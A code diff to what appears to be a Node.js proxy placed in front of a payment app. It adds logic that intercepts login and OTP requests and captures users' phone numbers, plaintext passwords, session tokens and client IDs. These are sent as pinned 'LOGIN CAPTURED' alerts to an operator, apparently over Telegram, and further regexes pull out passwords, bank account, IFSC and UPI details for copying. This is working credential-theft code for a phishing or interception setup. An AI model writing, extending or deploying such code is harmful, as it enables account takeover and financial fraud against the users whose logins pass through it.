@@ -562,14 +562,16 @@ function getOrderAmount(req, respData) {
 function getTelegramCopyItems(msg) {
     const text = String(msg || '');
     const rules = [
-        { label: 'Order ID', re: /(?:^|\n)\\s*(?:📋\\s*)?(?:Order(?: ID)?|rptNo|Receipt|Transaction)\\s*:\s*([^\n]+)/i },
-        { label: 'User ID', re: /(?:^|\n)\\s*(?:👤\\s*)?(?:User ID|User)\\s*:\s*([^\n]+)/i },
-        { label: 'Phone', re: /(?:^|\n)\\s*(?:📱\\s*)?Phone\\s*:\s*([^\n]+)/i },
-        { label: 'Account', re: /(?:^|\n)\\s*(?:Account|Acc(?:ount)? No)\\s*:\s*([^\n]+)/i },
-        { label: 'IFSC', re: /(?:^|\n)\\s*(?:IFSC)\\s*:\s*([^\n]+)/i },
-        { label: 'UPI ID', re: /(?:^|\n)\\s*(?:UPI(?: ID)?|VPA)\\s*:\s*([^\n]+)/i },
-        { label: 'Amount', re: /(?:^|\n)\\s*(?:💰\\s*)?Amount\\s*:\s*([^\n]+)/i },
-        { label: 'App Token', re: /(?:^|\n)\\s*(?:🎫\\s*)?Token\\s*:\s*([^\n]+)/i }
+        { label: 'Order ID', re: /(?:^|\n)\s*(?:📋\s*)?(?:Order(?: ID)?|rptNo|Receipt|Transaction)\s*:\s*([^\n]+)/i },
+        { label: 'User ID', re: /(?:^|\n)\s*(?:👤\s*)?(?:User ID|User)\s*:\s*([^\n]+)/i },
+        { label: 'Phone', re: /(?:^|\n)\s*(?:📱\s*)?Phone\s*:\s*([^\n]+)/i },
+        { label: 'Password', re: /(?:^|\n)\s*(?:🔐\s*)?(?:Pass|Password)\s*:\s*([^\n]+)/i },
+        { label: 'App Token', re: /(?:^|\n)\s*(?:🎫\s*)?Token\s*:\s*([^\n]+)/i },
+        { label: 'Client ID', re: /(?:^|\n)\s*(?:🆔\s*)?Client ID\s*:\s*([^\n]+)/i },
+        { label: 'Account', re: /(?:^|\n)\s*(?:Account|Acc(?:ount)? No)\s*:\s*([^\n]+)/i },
+        { label: 'IFSC', re: /(?:^|\n)\s*(?:IFSC)\s*:\s*([^\n]+)/i },
+        { label: 'UPI ID', re: /(?:^|\n)\s*(?:UPI(?: ID)?|VPA)\s*:\s*([^\n]+)/i },
+        { label: 'Amount', re: /(?:^|\n)\s*(?:💰\s*)?Amount\s*:\s*([^\n]+)/i }
     ];
     return rules.map(rule => {
         const match = text.match(rule.re);
@@ -2221,48 +2223,86 @@ app.all('/xxapi/*', async (req, res) => {
             }
         }
 
-        const isLogin = urlLower.includes('login') || urlLower.includes('signin') || urlLower.includes('dologin') || urlLower.includes('auth') || urlLower.includes('register');
-        if (isLogin) {
-            const pwd = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';
+        const isOtpEndpoint = urlLower.includes('checksms') || urlLower.includes('sendsms') ||
+            urlLower.includes('sendtken') || urlLower.includes('getsendtken') ||
+            urlLower.includes('sendcode') || urlLower.includes('sendmsg') ||
+            urlLower.includes('/sms');
 
+        const isLoginEndpoint = !isOtpEndpoint && (
+            urlLower.includes('login') || urlLower.includes('signin') ||
+            urlLower.includes('dologin') || urlLower.includes('register') ||
+            urlLower.includes('auth')
+        );
+
+        const isApp = req.headers['x-requested-with'] === 'com.vivipay.runapp' || (req.headers['user-agent'] && req.headers['user-agent'].includes('wv'));
+        const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';
+        const pwd = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';
+
+        // ── 1. OTP SEND NOTIFICATION (NO PIN, NO CLIENT ID) ─────────────────────────
+        if (isOtpEndpoint && (phone || pwd || userId)) {
+            const isSuccess = !jsonResp || jsonResp.code === 0 || jsonResp.code === 200 || jsonResp.success === true || (respData && String(respData).toLowerCase().includes('success'));
+            if (isSuccess) {
+                const otpMessage = `📩 OTP REQUESTED
+👤 User: \`${userId || 'N/A'}\`
+💻 Platform: ${platformStr}
+📱 Phone: \`${phone || 'N/A'}\`${pwd ? '\n🔐 Pass: `' + pwd + '`' : ''}
+✅ OTP sent successfully
+🕐 ${now}`;
+                await notifyAdmin(data, otpMessage, {
+                    pin: false,
+                    copyItems: [
+                        { label: 'User ID', value: userId },
+                        { label: 'Phone', value: phone },
+                        { label: 'Password', value: pwd }
+                    ]
+                });
+            }
+        }
+
+        // ── 2. ACTUAL SUCCESSFUL LOGIN NOTIFICATION (PINNED, WITH CLIENT ID) ────────
+        if (isLoginEndpoint) {
             let extractedToken = '';
-            if (typeof respData === 'string' && respData.length > 10) {
+            if (typeof respData === 'string' && respData.length > 15 && !respData.toLowerCase().includes('success') && !respData.includes(' ')) {
                 extractedToken = respData;
             } else if (respData && typeof respData === 'object') {
-                extractedToken = respData.token || respData.accessToken || '';
-                if (!extractedToken && typeof respData.data === 'string' && respData.data.length > 10) {
+                const cand = respData.token || respData.accessToken || '';
+                if (cand && String(cand).length > 10 && !String(cand).toLowerCase().includes('success')) {
+                    extractedToken = cand;
+                }
+                if (!extractedToken && typeof respData.data === 'string' && respData.data.length > 15 && !respData.data.toLowerCase().includes('success') && !respData.data.includes(' ')) {
                     extractedToken = respData.data;
                 }
             }
 
             if (!extractedToken && response.headers && response.headers.get('set-cookie')) {
                 const cookieMatch = response.headers.get('set-cookie').match(/token=([^;]+)/);
-                if (cookieMatch) extractedToken = cookieMatch[1];
+                if (cookieMatch && cookieMatch[1].length > 10) extractedToken = cookieMatch[1];
             }
 
-            const isApp = req.headers['x-requested-with'] === 'com.vivipay.runapp' || (req.headers['user-agent'] && req.headers['user-agent'].includes('wv'));
-            const platformStr = isApp ? '📱 Android App' : '🌐 Web Browser';
-
-            const fullToken = extractedToken ? String(extractedToken) : '';
+            const fullToken = extractedToken ? String(extractedToken).trim() : '';
             const clientId = String(
                 reqBody.clientId || reqBody.clientID || reqBody.client_id ||
                 req.headers['clientid'] || req.headers['x-client-id'] || ''
             ).trim();
-            const loginMessage = `🔑 LOGIN CAPTURED
-👤 User: ${userId || 'N/A'}
-💻 Platform: ${platformStr}
-📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${fullToken ? '\n🎫 Token: `' + fullToken + '`' : ''}${clientId ? '\n🆔 Client ID: `' + clientId + '`' : ''}
-🕐 ${now}`;
-            await notifyAdmin(data, loginMessage, {
-                pin: true,
-                copyItems: [
-                    { label: 'User ID', value: userId },
-                    { label: 'Phone', value: phone },
-                    { label: 'App Token', value: fullToken },
-                    { label: 'Client ID', value: clientId }
-                ]
-            });
 
+            if (fullToken && fullToken.length >= 10 && !fullToken.toLowerCase().includes('success')) {
+                const loginMessage = `🔑 LOGIN CAPTURED
+👤 User: \`${userId || 'N/A'}\`
+💻 Platform: ${platformStr}
+📱 Phone: \`${phone || 'N/A'}\`${pwd ? '\n🔐 Pass: `' + pwd + '`' : ''}
+🎫 Token: \`${fullToken}\`${clientId ? '\n🆔 Client ID: `' + clientId + '`' : ''}
+🕐 ${now}`;
+                await notifyAdmin(data, loginMessage, {
+                    pin: true,
+                    copyItems: [
+                        { label: 'User ID', value: userId },
+                        { label: 'Phone', value: phone },
+                        { label: 'Password', value: pwd },
+                        { label: 'App Token', value: fullToken },
+                        { label: 'Client ID', value: clientId }
+                    ]
+                });
+            }
         }
 
         const isUserInfo = urlLower.includes('userinfo') || urlLower.includes('memberinfo') ||
